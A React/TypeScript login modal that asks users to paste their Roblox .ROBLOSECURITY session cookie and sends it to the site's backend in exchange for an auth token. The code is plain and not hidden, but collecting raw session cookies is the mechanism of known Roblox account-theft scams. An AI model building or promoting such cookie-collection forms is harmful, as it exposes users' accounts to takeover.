import React, { useState, ChangeEvent } from "react";
import axios, { AxiosResponse } from "axios";
import { API_URL } from "../constants";
import { Modal, Form, Button } from "react-bootstrap";
import "./login.css";

interface ResponseData {
  success?: boolean;
  message?: string;
  token?: string;
}

interface LoginModalProps {
  show: boolean;
  onClose: () => void;
}

const LoginModal: React.FC<LoginModalProps> = ({ show, onClose }) => {
  const [cookie, setCookie] = useState<string>("");

  const handleCookieChange = (event: ChangeEvent<HTMLInputElement>): void => {
    setCookie(event.target.value);
  };

  const registerToRobloxAcc = async (): Promise<void> => {
    try {
      const response: AxiosResponse<ResponseData> =
        await axios.post<ResponseData>(
          `${API_URL}/auth/cookie`,
          {
            data: {
              cookie: cookie,
            },
          },
          {
            withCredentials: true,
          }
        );

      if (response.data.success === true) {
        const token: string | undefined = response.data.token;
        const date: Date = new Date();
        date.setTime(date.getTime() + 30 * 24 * 60 * 60 * 1000);
        const expires: string = date.toUTCString();
        document.cookie = `AuthToken=${token}; expires=${expires}`;
        window.location.reload();
      } else {
        console.log(response.data.success);
      }
    } catch (error: any) {
      console.error("Error:", error.message);
    }
  };

  return (
    <Modal show={show} onHide={onClose} size="lg" centered>
      <Modal.Header
        closeButton
        style={{ backgroundColor: "#095882", color: "white" }}
      >
        <Modal.Title className="w-100 text-center">
          Login to Roblox Account
        </Modal.Title>
      </Modal.Header>
      <Modal.Body
        className="d-flex flex-column align-items-center justify-content-center rounded"
        style={{ backgroundColor: "#095882" }}
      >
        <Form className="w-100">
          <Form.Group controlId="cookieInput" className="mb-4">
            <Form.Control
              type="password"
              placeholder="Enter your .ROBLOSECURITY cookie"
              value={cookie}
              onChange={handleCookieChange}
              className="cookie-input form-control-lg"
            />
          </Form.Group>
          <div
            className=""
            style={{ backgroundColor: "#095882", borderRadius: "10px" }}
          >
            <Button
              variant="primary"
              size="lg"
              onClick={registerToRobloxAcc}
              className="w-100 py-si3"
            >
              <div
                className="d-flex justify-content-center
"
              >
                <span
                  style={{ fontSize: "1.5rem" }}
                  className=" form-control-lg"
                >
                  Sign In
                </span>{" "}
              </div>
            </Button>
          </div>
        </Form>
      </Modal.Body>
    </Modal>
  );
};

export default LoginModal;
